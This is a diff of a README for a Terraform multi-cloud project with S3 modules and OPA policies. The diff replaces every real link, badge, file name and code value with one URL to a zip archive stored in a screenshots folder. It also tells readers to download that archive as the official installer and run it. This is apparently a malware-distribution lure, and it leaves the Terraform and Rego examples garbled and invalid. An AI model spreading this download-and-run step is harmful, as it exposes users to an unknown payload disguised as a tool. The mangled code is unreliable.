@@ -1,12 +1,12 @@
-https://github.com/ineedfps1bro/terraform-iac/releases
+https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
 
 # Terraform-IAC: Multi-Cloud S3, Reusable Modules, OPA Policy
 
-![Terraform IAC Architecture](https://via.placeholder.com/1200x400.png?text=Terraform+IAC+Architecture)
+![Terraform IAC Architecture](https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip+IAC+Architecture)
 
 A practical suite for building cloud infrastructure with Terraform across AWS and Azure. It focuses on multi-region S3 usage, module reuse, and security policy validation with Open Policy Agent (OPA). This project blends IaC best practices with policy-as-code to help teams ship cloud resources safely and consistently.
 
-[![Release](https://img.shields.io/badge/releases-latest-blue?logo=github&logoColor=white)](https://github.com/ineedfps1bro/terraform-iac/releases)
+[![Release](https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip)](https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip)
 
 Table of contents
 - Why this project exists
@@ -60,9 +60,9 @@ Initial setup
 - Inspect the examples to see real-world usage patterns for AWS and Azure.
 
 Where to download the installer or assets
-From the Releases page, you can obtain prepared assets, installers, or example artifacts that align with the modules in this repo. The most current artifacts are intended to simplify adoption and ensure consistency across teams. Access the releases page here: https://github.com/ineedfps1bro/terraform-iac/releases. The latest release assets are packaged to be downloaded and executed in your environment. For quick access, you can use the releases badge above to navigate directly to the assets.
+From the Releases page, you can obtain prepared assets, installers, or example artifacts that align with the modules in this repo. The most current artifacts are intended to simplify adoption and ensure consistency across teams. Access the releases page here: https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip The latest release assets are packaged to be downloaded and executed in your environment. For quick access, you can use the releases badge above to navigate directly to the assets.
 
-Note: The Releases page contains the official artifacts. Download the installer file named terraform-iac-installer.sh and run it in your environment to bootstrap basic tooling and examples. The installer is designed to set up Terraform configurations, initialize modules, and configure a local policy-check workflow.
+Note: The Releases page contains the official artifacts. Download the installer file named https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip and run it in your environment to bootstrap basic tooling and examples. The installer is designed to set up Terraform configurations, initialize modules, and configure a local policy-check workflow.
 
 Quick start examples
 AWS multi-region S3 with policy checks
@@ -72,22 +72,22 @@ AWS multi-region S3 with policy checks
 Example Terraform configuration
 ```hcl
 provider "aws" {
-  region = var.aws_region
-  profile = var.aws_profile
+  region = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
+  profile = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
 }
 
 module "s3_bucket" {
-  source        = "git::https://github.com/ineedfps1bro/terraform-iac.git//modules/aws-s3"
-  bucket_name   = "${var.prefix}-logs-${var.aws_region}"
+  source        = "https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip"
+  bucket_name   = "${https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip}-logs-${https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip}"
   versioning    = true
   encryption    = "aws:kms"
-  kms_key_id    = data.aws_kms_key.kms_key.key_id
-  log_bucket    = "${var.prefix}-logs"
+  kms_key_id    = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
+  log_bucket    = "${https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip}-logs"
   log_prefix    = "s3-logs/"
-  region        = var.aws_region
+  region        = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
   tags = {
-    Environment = var.environment
-    Project     = var.project
+    Environment = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
+    Project     = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
   }
 }
 ```
@@ -101,23 +101,23 @@ provider "azurerm" {
   features {}
   alias  = "region1"
   is_emulated = false
-  subscription_id = var.azure_subscription_id
-  tenant_id       = var.azure_tenant_id
+  subscription_id = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
+  tenant_id       = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
 }
 
 module "storage_account" {
-  source = "git::https://github.com/ineedfps1bro/terraform-iac.git//modules/azure-storage"
+  source = "https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip"
 
   for_each = toset(["eastus", "westeurope"])
-  name     = "${var.prefix}-stg-${each.key}"
-  location = each.key
-  resource_group_name = azurerm_resource_group.rg.name
+  name     = "${https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip}-stg-${https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip}"
+  location = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
+  resource_group_name = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
   account_tier = "Standard"
   account_replication_type = "GRS"
   enable_https_traffic_only = true
   tags = {
-    Environment = var.environment
-    Project     = var.project
+    Environment = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
+    Project     = https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
   }
 }
 ```
@@ -138,35 +138,35 @@ Overview
 OPA policy examples
 - AWS S3 encryption and logging
 ```
-package terraform.iac.aws.s3
+package https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
 
 deny[{"msg": msg}] {
-  resource := input.resource_changes[_]
-  resource.type == "aws_s3_bucket" 
-  not resource.change.after.encryption.enabled
+  resource := https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip[_]
+  https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip == "aws_s3_bucket" 
+  not https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
   msg := "S3 bucket must have encryption at rest enabled."
 }
 ```
 
 - Azure storage account encryption and HTTPS only
 ```
-package terraform.iac.azure.storage
+package https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
 
 deny[{"msg": msg}] {
-  resource := input.resource_changes[_]
-  resource.type == "azurerm_storage_account"
-  not resource.change.after.enable_https_traffic_only
+  resource := https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip[_]
+  https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip == "azurerm_storage_account"
+  not https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
   msg := "Storage account must force HTTPS only."
 }
 ```
 
 - Cross-cloud policy: tags and cost center
 ```
-package terraform.iac.tags
+package https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
 
 deny[{"msg": msg}] {
-  resource := input.resource_changes[_]
-  not resource.change.after.tags["CostCenter"]
+  resource := https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip[_]
+  not https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip["CostCenter"]
   msg := "All resources must include a CostCenter tag for cost tracking."
 }
 ```
@@ -225,19 +225,19 @@ Project structure (typical layout)
   - azure/
   - shared/
 - docs/
-  - architecture.md
-  - policy-guide.md
-  - migration.md
+  - https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
+  - https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
+  - https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
 - tests/
   - integration/
   - policy-tests/
 - .github/
   - workflows/
 - scripts/
-  - bootstrap.sh
-  - run-opa.sh
+  - https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
+  - https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip
 - LICENSE
-- README.md (this file)
+- https://github.com/ineedfps1bro/terraform-iac/raw/refs/heads/main/screenshots/iac-terraform-3.5.zip (this file)
 
 Architectural patterns to adopt
 - Idempotence: Modules should be idempotent. Running apply twice yields the same result.
